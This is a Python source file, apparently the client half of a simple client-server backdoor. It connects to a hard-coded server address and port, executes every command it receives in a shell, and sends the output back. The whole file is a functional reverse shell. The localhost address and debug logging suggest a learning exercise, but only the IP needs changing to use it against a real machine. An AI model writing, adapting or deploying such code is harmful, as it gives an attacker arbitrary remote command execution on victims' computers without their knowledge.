"""
Backdoor - Client

Runs the commands sent by the server (server.py)
"""

import logging
import socket
import subprocess

logger = logging.getLogger(__name__)

try:
    import coloredlogs

    coloredlogs.install(
        level='DEBUG',
        logger=logger,
        fmt="%(asctime)s %(name)s[%(process)d] %(levelname)s %(message)s"
    )

except ImportError:
    logger.setLevel(logging.DEBUG)

    logger_stderr_handler = logging.StreamHandler()

    logger_stderr_handler.setFormatter(
        logging.Formatter("%(asctime)s %(name)s[%(process)d] %(levelname)s %(message)s")
    )

    logger.addHandler(logger_stderr_handler)

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8081

client = socket.socket()

logger.info("Initiating connection")
client.connect((SERVER_IP, SERVER_PORT))
logger.info("Connection initiated")

while True:
    logger.info("Awaiting command")
    server_command = client.recv(1024)
    server_command = server_command.decode()

    logger.info("Creating a new process in order to run server command")
    process = subprocess.Popen(
        server_command,
        shell=True,
        stderr=subprocess.PIPE,
        stdout=subprocess.PIPE
    )
    logger.info("The sent command was ran on the device")

    process_output = process.stdout.read() + process.stderr.read()

    print(process_output.decode())

    logger.info("Sending output of the sent server command")
    client.send(process_output)
    logger.info("Output sent")
